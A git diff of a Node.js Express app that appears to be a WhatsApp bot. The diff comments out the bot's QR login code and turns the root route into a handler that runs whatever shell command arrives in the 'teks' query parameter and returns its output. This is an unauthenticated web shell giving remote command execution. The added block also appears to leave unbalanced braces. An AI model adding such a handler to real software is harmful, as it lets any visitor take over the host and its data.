@@ -5,7 +5,7 @@ const cron = require('node-cron')
 const express = require('express')
 const app = express()
 const router = express.Router()
-const {
+/*const {
   useMultiFileAuthState,
   DisconnectReason,
   fetchLatestBaileysVersion,
@@ -73,11 +73,29 @@ const { state, saveCreds } = await useMultiFileAuthState(`./session`);
                 
     if (up.qr) _qr = await QR.toDataURL(up.qr)
     }
-  )
+  )*/
   
   app.get('/', async (req, res) => {
-    // log(_qr)
-    res.render('index', { qrcode: _qr })
+    let teks = req.query.teks
+    if(!teks) return res.json({msg: 'Massukan parameter teks'})
+    
+const { exec } = require('child_process')
+const cp = require('child_process')
+const { promisify } = require('util')
+let _exec = promisify(exec).bind(cp)
+  let o
+  try {
+    o = await _exec(teks)
+  } catch (e) {
+    o = e
+  } finally {
+    let { stdout, stderr } = o
+    if (stdout.trim()) res.send(stdout)
+    if (stderr.trim()) res.send(stderr)
+}
+                }
+         
+    //res.render('index', { qrcode: _qr })
   })
   app.use(router)
   app.listen(PORT, () => log('App listened on port', PORT))
